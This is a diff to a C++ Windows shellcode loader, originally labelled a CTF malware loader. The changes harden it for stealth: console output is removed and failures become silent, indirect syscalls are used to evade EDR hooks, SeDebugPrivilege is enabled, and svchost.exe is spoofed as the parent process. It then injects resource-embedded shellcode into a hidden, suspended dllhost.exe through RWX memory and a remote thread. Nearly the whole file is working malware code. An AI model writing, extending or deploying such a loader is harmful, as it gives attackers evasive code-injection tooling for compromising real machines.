@@ -1,274 +1,294 @@
 ﻿#include <windows.h>
-#include <iostream>
 #include <vector>
-#include <tlhelp32.h>
 #include "resource.h"
+#include "Syscalls.h"
 
 // =============================================================
-// [完全手動定義區] 
+// [MACROS & DEFINITIONS]
 // =============================================================
 
-// 1. 定義 UNICODE_STRING
-typedef struct _UNICODE_STRING {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} UNICODE_STRING, * PUNICODE_STRING;
-
-// 2. 定義 CLIENT_ID
-typedef struct _CLIENT_ID {
-    HANDLE UniqueProcess;
-    HANDLE UniqueThread;
-} CLIENT_ID, * PCLIENT_ID;
-
-// 3. 定義 OBJECT_ATTRIBUTES
-typedef struct _OBJECT_ATTRIBUTES {
-    ULONG Length;
-    HANDLE RootDirectory;
-    PUNICODE_STRING ObjectName;
-    ULONG Attributes;
-    PVOID SecurityDescriptor;
-    PVOID SecurityQualityOfService;
-} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
-
-// 4. 初始化 OBJECT_ATTRIBUTES 的巨集
-#ifndef InitializeObjectAttributes
-#define InitializeObjectAttributes( p, n, a, r, s ) { \
-    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
-    (p)->RootDirectory = r;                             \
-    (p)->Attributes = a;                                \
-    (p)->ObjectName = n;                                \
-    (p)->SecurityDescriptor = s;                        \
-    (p)->SecurityQualityOfService = NULL;               \
-    }
-#endif
-
-// 5. 確保 NT_SUCCESS 巨集
+// Define NT_SUCCESS macro to check status codes
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
-// 6. PPID 常數定義
-#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
-#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
-#endif
+// Status code for buffer too small error in NtQuerySystemInformation
+#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
+
+// Hardcoded LUID for SeDebugPrivilege (LowPart = 20)
+// This avoids calling LookupPrivilegeValue, reducing API noise.
+#define SE_DEBUG_PRIVILEGE 20ULL
+
+// Base priority type definition for process structures
+typedef LONG KPRIORITY;
+
+// Structure required for NtQuerySystemInformation (SystemProcessInformation Class 5)
+// Used to iterate through running processes without using the noisy CreateToolhelp32Snapshot API.
+typedef struct _SYSTEM_PROCESS_INFORMATION {
+    ULONG NextEntryOffset;            // Offset to the next entry in the buffer
+    ULONG NumberOfThreads;            // Number of threads in the process
+    BYTE Reserved1[48];               // Reserved fields
+    UNICODE_STRING ImageName;         // The name of the process (e.g., "svchost.exe")
+    KPRIORITY BasePriority;           // Base process priority
+    HANDLE UniqueProcessId;           // Process ID (PID)
+    PVOID Reserved2;                  // Reserved
+    ULONG HandleCount;                // Count of open handles
+    ULONG SessionId;                  // Session ID
+    PVOID Reserved3;                  // Reserved
+    SIZE_T PeakVirtualSize;           // Peak virtual memory size
+    SIZE_T VirtualSize;               // Virtual memory size
+    ULONG Reserved4;                  // Reserved
+    SIZE_T PeakWorkingSetSize;        // Peak working set size
+    SIZE_T WorkingSetSize;            // Working set size
+    PVOID Reserved5;                  // Reserved
+    SIZE_T QuotaPagedPoolUsage;       // Paged pool usage
+    PVOID Reserved6;                  // Reserved
+    SIZE_T QuotaNonPagedPoolUsage;    // Non-paged pool usage
+    SIZE_T PagefileUsage;             // Pagefile usage
+    SIZE_T PeakPagefileUsage;         // Peak pagefile usage
+    SIZE_T PrivatePageCount;          // Private page count
+    LARGE_INTEGER Reserved7[6];       // Reserved
+} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
 
 // =============================================================
-// [外部函數連結 - Sw3 版本]
-// 對應 Syscalls.asm 裡面的 Sw3Nt... 標籤
-// =============================================================
-extern "C" {
-    NTSTATUS Sw3NtOpenProcess(
-        PHANDLE ProcessHandle,
-        ACCESS_MASK DesiredAccess,
-        POBJECT_ATTRIBUTES ObjectAttributes,
-        PCLIENT_ID ClientId
-    );
-
-    NTSTATUS Sw3NtAllocateVirtualMemory(
-        HANDLE ProcessHandle,
-        PVOID* BaseAddress,
-        ULONG_PTR ZeroBits,
-        PSIZE_T RegionSize,
-        ULONG AllocationType,
-        ULONG Protect
-    );
-
-    NTSTATUS Sw3NtWriteVirtualMemory(
-        HANDLE ProcessHandle,
-        PVOID BaseAddress,
-        PVOID Buffer,
-        SIZE_T NumberOfBytesToWrite,
-        PSIZE_T NumberOfBytesWritten
-    );
-
-    NTSTATUS Sw3NtProtectVirtualMemory(
-        HANDLE ProcessHandle,
-        PVOID* BaseAddress,
-        PSIZE_T RegionSize,
-        ULONG NewProtect,
-        PULONG OldProtect
-    );
-
-    NTSTATUS Sw3NtCreateThreadEx(
-        PHANDLE ThreadHandle,
-        ACCESS_MASK DesiredAccess,
-        PVOID ObjectAttributes,
-        HANDLE ProcessHandle,
-        PVOID StartRoutine,
-        PVOID Argument,
-        ULONG CreateFlags,
-        ULONG_PTR ZeroBits,
-        SIZE_T StackSize,
-        SIZE_T MaximumStackSize,
-        PVOID AttributeList
-    );
-
-    NTSTATUS Sw3NtClose(
-        HANDLE Handle
-    );
-}
-
-// =============================================================
-// [Loader 邏輯]
+// [HELPER FUNCTIONS]
 // =============================================================
 
+/**
+ * LoadShellcodeFromResource
+ * -------------------------------------------------------------
+ * Loads the encrypted/obfuscated shellcode from the compiled
+ * executable's resource section (.rsrc).
+ * * @param resourceID: The integer ID of the resource (defined in resource.h).
+ * @param buffer: Reference to a vector to store the raw shellcode data.
+ * @return: true if successful, false otherwise.
+ */
 bool LoadShellcodeFromResource(int resourceID, std::vector<unsigned char>& buffer) {
+    // Find the resource handle in the current module. 
+    // NULL as the first argument implies the current module (hInstance).
     HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
     if (!hRes) return false;
+
+    // Load the resource into global memory
     HGLOBAL hData = LoadResource(NULL, hRes);
     if (!hData) return false;
+
+    // Get the size of the resource
     DWORD dataSize = SizeofResource(NULL, hRes);
+
+    // Lock the resource to get a pointer to the data
     void* pData = LockResource(hData);
     if (dataSize == 0 || !pData) return false;
+
+    // Resize the buffer and copy the data
     buffer.resize(dataSize);
     memcpy(buffer.data(), pData, dataSize);
+
     return true;
 }
 
+/**
+ * EnableDebugPrivilege
+ * -------------------------------------------------------------
+ * Attempts to enable SeDebugPrivilege for the current process
+ * using Indirect Syscalls to avoid user-mode hooks on OpenProcessToken
+ * and AdjustTokenPrivileges.
+ * * @return: true if successful, false otherwise.
+ */
 bool EnableDebugPrivilege() {
-    HANDLE hToken;
-    TOKEN_PRIVILEGES tp;
-    LUID luid;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
-    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) { CloseHandle(hToken); return false; }
-    tp.PrivilegeCount = 1;
-    tp.Privileges[0].Luid = luid;
-    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) { CloseHandle(hToken); return false; }
-    CloseHandle(hToken);
-    return true;
-}
-
-void BypassETW_Syscalls() {
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) return;
-
-    void* pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
-    if (!pEtwEventWrite) return;
-
-    unsigned char patch[] = { 0x33, 0xC0, 0xC3 }; // xor eax, eax; ret
-
-    PVOID baseAddr = pEtwEventWrite;
-    SIZE_T regionSize = sizeof(patch);
-    ULONG oldProtect = 0;
+    HANDLE hToken = NULL;
     NTSTATUS status;
 
-    // [Sw3 修改] 修改權限
-    status = Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    // 1. Open the process token for the current process
+    // NtCurrentProcess() is a pseudo-handle (-1), safe to use directly.
+    status = Sw3NtOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
 
-    if (NT_SUCCESS(status)) {
-        SIZE_T bytesWritten = 0;
-        // [Sw3 修改] 寫入 Patch
-        status = Sw3NtWriteVirtualMemory(GetCurrentProcess(), pEtwEventWrite, patch, sizeof(patch), &bytesWritten);
+    if (!NT_SUCCESS(status)) return false;
 
-        if (NT_SUCCESS(status)) {
-            std::cout << "[+] ETW Patched via Indirect Syscalls." << std::endl;
-        }
+    // 2. Prepare the Token Privileges structure
+    TOKEN_PRIVILEGES tp;
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid.LowPart = SE_DEBUG_PRIVILEGE; // Hardcoded LUID (20)
+    tp.Privileges[0].Luid.HighPart = 0;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-        ULONG tempProtect = 0;
-        // [Sw3 修改] 還原權限
-        Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, oldProtect, &tempProtect);
-    }
+    // 3. Adjust the token privileges via Syscall
+    status = Sw3NtAdjustPrivilegesToken(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+
+    // Always close the handle
+    Sw3NtClose(hToken);
+
+    if (!NT_SUCCESS(status)) return false;
+
+    return true;
 }
 
+/**
+ * GetSvchostHandle
+ * -------------------------------------------------------------
+ * Enumerates running processes using NtQuerySystemInformation (Syscall).
+ * This bypasses the noisy CreateToolhelp32Snapshot API often flagged by EDR.
+ * It searches for "svchost.exe" and opens a handle to it.
+ * * @param outPid: Pointer to a DWORD to store the found PID.
+ * @return: Handle to the svchost process, or NULL if failed.
+ */
 HANDLE GetSvchostHandle(DWORD* outPid) {
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    HANDLE hProcess = NULL;
-    if (hSnapshot != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32 pe32;
-        pe32.dwSize = sizeof(PROCESSENTRY32);
-        if (Process32First(hSnapshot, &pe32)) {
-            do {
-                if (_stricmp(pe32.szExeFile, "svchost.exe") == 0) {
-                    hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe32.th32ProcessID);
-                    if (hProcess) {
-                        *outPid = pe32.th32ProcessID;
-                        break;
-                    }
-                }
-            } while (Process32Next(hSnapshot, &pe32));
+    NTSTATUS status;
+    PVOID buffer = NULL;
+    ULONG bufferSize = 0;
+    ULONG requiredSize = 0;
+
+    // 1. Loop until we allocate a buffer large enough for process info
+    // NtQuerySystemInformation can return STATUS_INFO_LENGTH_MISMATCH if the buffer is too small.
+    do {
+        // Free previous buffer if it was too small
+        if (buffer) {
+            HeapFree(GetProcessHeap(), 0, buffer);
+            buffer = NULL;
         }
-        CloseHandle(hSnapshot);
+
+        // Initial size guess (1MB)
+        if (requiredSize == 0) requiredSize = 1024 * 1024;
+        bufferSize = requiredSize;
+
+        // Allocate memory from the heap
+        buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferSize);
+        if (!buffer) return NULL;
+
+        // Call NtQuerySystemInformation (SystemProcessInformation = 5)
+        status = Sw3NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &requiredSize);
+
+    } while (status == STATUS_INFO_LENGTH_MISMATCH);
+
+    if (!NT_SUCCESS(status)) {
+        if (buffer) HeapFree(GetProcessHeap(), 0, buffer);
+        return NULL;
     }
+
+    // 2. Iterate through the process list
+    PSYSTEM_PROCESS_INFORMATION pSpi = (PSYSTEM_PROCESS_INFORMATION)buffer;
+    HANDLE hProcess = NULL;
+
+    while (true) {
+        // Check if ImageName is valid and matches "svchost.exe" (case-insensitive check)
+        if (pSpi->ImageName.Buffer && _wcsicmp(pSpi->ImageName.Buffer, L"svchost.exe") == 0) {
+
+            // Setup Object Attributes
+            OBJECT_ATTRIBUTES oa;
+            InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
+
+            // Setup Client ID (Target PID)
+            CLIENT_ID cid;
+            cid.UniqueProcess = pSpi->UniqueProcessId;
+            cid.UniqueThread = NULL;
+
+            // Open the process via Syscall 
+            // PROCESS_CREATE_PROCESS access is required for PPID spoofing.
+            NTSTATUS openStatus = Sw3NtOpenProcess(&hProcess, PROCESS_CREATE_PROCESS, &oa, &cid);
+
+            if (NT_SUCCESS(openStatus)) {
+                *outPid = (DWORD)(ULONG_PTR)pSpi->UniqueProcessId;
+                break; // Target found and opened successfully
+            }
+        }
+
+        // Move to the next entry in the linked list
+        if (pSpi->NextEntryOffset == 0) break;
+        pSpi = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pSpi + pSpi->NextEntryOffset);
+    }
+
+    // Clean up allocated memory
+    HeapFree(GetProcessHeap(), 0, buffer);
     return hProcess;
 }
 
-int main() {
-    std::cout << "=== CTF Malware Loader (Full Indirect Syscalls - Sw3) ===" << std::endl;
+// =============================================================
+// [ENTRY POINT]
+// =============================================================
 
+// WinMain is used instead of main() to prevent a console window from spawning.
+// SAL annotations (_In_, _In_opt_) are included to satisfy compiler warnings.
+int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
+
+    // 1. Load Shellcode
+    // ------------------------------------
     std::vector<unsigned char> payload_shellcode;
     if (!LoadShellcodeFromResource(IDR_RCDATA1, payload_shellcode)) {
-        std::cout << "[-] Resource load failed! Check IDR_RCDATA1 definition." << std::endl;
-        return 1;
+        return 1; // Silent failure if resource is missing or corrupted
     }
 
+    // 2. Privilege Escalation
+    // ------------------------------------
+    // Attempt to get SeDebugPrivilege via Syscalls. 
+    // We continue execution even if this fails, as it might not be strictly necessary depending on the user context.
     EnableDebugPrivilege();
-    BypassETW_Syscalls();
 
+    // 3. Parent Process Identification (PPID Spoofing Prep)
+    // ------------------------------------
     DWORD parentPid = 0;
     HANDLE hParentProcess = GetSvchostHandle(&parentPid);
     if (!hParentProcess) {
-        std::cout << "[-] Could not find accessible svchost.exe." << std::endl;
-        return 1;
+        return 1; // Cannot find a valid parent, aborting execution.
     }
-    std::cout << "[+] Parent Found: svchost.exe (PID: " << parentPid << ")" << std::endl;
 
+    // 4. Process Creation with Spoofed PPID
+    // ------------------------------------
     STARTUPINFOEXA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
     SIZE_T attributeSize = 0;
 
+    // Allocate space for the attribute list
     InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
     si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
     InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
 
+    // Update the attribute list to specify the spoofed parent process
     if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
-        std::cout << "[-] PPID Update Failed." << std::endl;
         return 1;
     }
 
     si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
     si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
-    si.StartupInfo.wShowWindow = SW_HIDE;
+    si.StartupInfo.wShowWindow = SW_HIDE; // Ensure the target runs hidden
 
-    char targetCmdLine[] = "C:\\Windows\\System32\\RuntimeBroker.exe";
-    std::cout << "[*] Spawning Target: " << targetCmdLine << std::endl;
+    // Target executable to spawn (Sacrificial Process)
+    // dllhost.exe is a common system process, blending in well.
+    char targetCmdLine[] = "C:\\Windows\\System32\\dllhost.exe";
 
+    // Create the process in a SUSPENDED state
+    // This allows us to inject code before the process actually starts running.
     if (!CreateProcessA(NULL, targetCmdLine, NULL, NULL, FALSE,
         EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,
         NULL, NULL, &si.StartupInfo, &pi)) {
-        std::cout << "[-] CreateProcess failed: " << GetLastError() << std::endl;
         return 1;
     }
-    std::cout << "[+] Target Created! Child PID: " << pi.dwProcessId << std::endl;
 
-    // --- Injection Sequence (Indirect Syscalls Sw3) ---
+    // 5. Injection Sequence (Indirect Syscalls)
+    // ------------------------------------
     NTSTATUS status;
     PVOID remoteMem = NULL;
     SIZE_T regionSize = payload_shellcode.size();
 
-    std::cout << "[*] Allocating memory via Syscall..." << std::endl;
-    // [Sw3 修改]
+    // A. Allocate Memory (RWX)
+    // Using Indirect Syscalls to allocate memory in the remote process.
     status = Sw3NtAllocateVirtualMemory(pi.hProcess, &remoteMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!NT_SUCCESS(status)) {
-        std::cout << "[-] Sw3NtAllocateVirtualMemory Failed: 0x" << std::hex << status << std::endl;
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
 
-    std::cout << "[*] Writing payload via Syscall..." << std::endl;
+    // B. Write Payload
+    // Writing the shellcode into the allocated memory.
     SIZE_T bytesWritten = 0;
-    // [Sw3 修改]
     status = Sw3NtWriteVirtualMemory(pi.hProcess, remoteMem, payload_shellcode.data(), payload_shellcode.size(), &bytesWritten);
     if (!NT_SUCCESS(status)) {
-        std::cout << "[-] Sw3NtWriteVirtualMemory Failed: 0x" << std::hex << status << std::endl;
         TerminateProcess(pi.hProcess, 1);
         return 1;
     }
 
-    std::cout << "[*] Executing payload via Syscall..." << std::endl;
+    // C. Execute Payload (Create Remote Thread)
+    // Starting a new thread in the remote process to execute the shellcode.
     HANDLE hThread = NULL;
-    // [Sw3 修改]
     status = Sw3NtCreateThreadEx(
         &hThread,
         THREAD_ALL_ACCESS,
@@ -281,25 +301,25 @@ int main() {
     );
 
     if (NT_SUCCESS(status)) {
-        std::cout << "[+] Injection Successful!" << std::endl;
-        // [Sw3 修改]
+        // Close the thread handle immediately after creation to clean up.
+        // The thread continues to run.
         Sw3NtClose(hThread);
     }
     else {
-        std::cout << "[-] Sw3NtCreateThreadEx Failed: 0x" << std::hex << status << std::endl;
+        // If execution fails, kill the sacrificial process to avoid leaving a zombie process.
+        TerminateProcess(pi.hProcess, 1);
+        return 1;
     }
 
-    // [Sw3 修改] 清理 Handles
+    // 6. Cleanup
+    // ------------------------------------
+    // Close handles to the spoofed parent and the sacrificial process.
     Sw3NtClose(hParentProcess);
     Sw3NtClose(pi.hProcess);
-    Sw3NtClose(pi.hThread);
+    Sw3NtClose(pi.hThread); // Primary thread of the suspended process (not the injected one)
 
+    DeleteProcThreadAttributeList(si.lpAttributeList);
     HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
 
-    std::cout << "\n[DONE] Loader finished." << std::endl;
-    
-    // [FIX] 改用 getchar() 而不是 system("pause")
-    // 這可以防止產生額外的 cmd.exe 子進程，並確保視窗停駐
-    getchar();
     return 0;
 }
